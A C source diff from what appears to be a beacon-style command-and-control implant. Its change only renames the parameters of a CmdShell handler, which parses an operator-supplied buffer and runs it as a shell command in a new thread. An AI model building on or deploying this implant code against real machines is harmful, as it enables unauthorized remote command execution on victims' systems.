@@ -267,8 +267,8 @@ DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     return TRUE;
 }
 
-VOID CmdShell(unsigned char* commandBuf, size_t commandBuflen) { 
-	// 解决线程运行但 commandBuf 可能被释放的问题
+VOID CmdShell(unsigned char* command, size_t command_length) { 
+	// 解决线程运行但 command 可能被释放的问题
     struct ShellThreadArgs* args = malloc(sizeof(struct ShellThreadArgs));
     if (!args) {
 		fprintf(stderr, "Memory allocation failed\n");
@@ -276,17 +276,17 @@ VOID CmdShell(unsigned char* commandBuf, size_t commandBuflen) {
     }
 
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
 
-    args->cmdBuffer = (unsigned char*)malloc(commandBuflen);
+    args->cmdBuffer = (unsigned char*)malloc(command_length);
     if(!args->cmdBuffer) {
         fprintf(stderr, "Memory allocation failed\n");
         free(args);
         return;
 	}
 
-    memcpy(args->cmdBuffer, BeaconDataPtr(&parser, commandBuflen), commandBuflen);
-    args->cmdBufferLength = commandBuflen;
+    memcpy(args->cmdBuffer, BeaconDataPtr(&parser, command_length), command_length);
+    args->cmdBufferLength = command_length;
 
     ParseCommandShellStruct ParseCommand = ParseCommandShell(args->cmdBuffer, args->cmdBufferLength);
     HANDLE myThread;
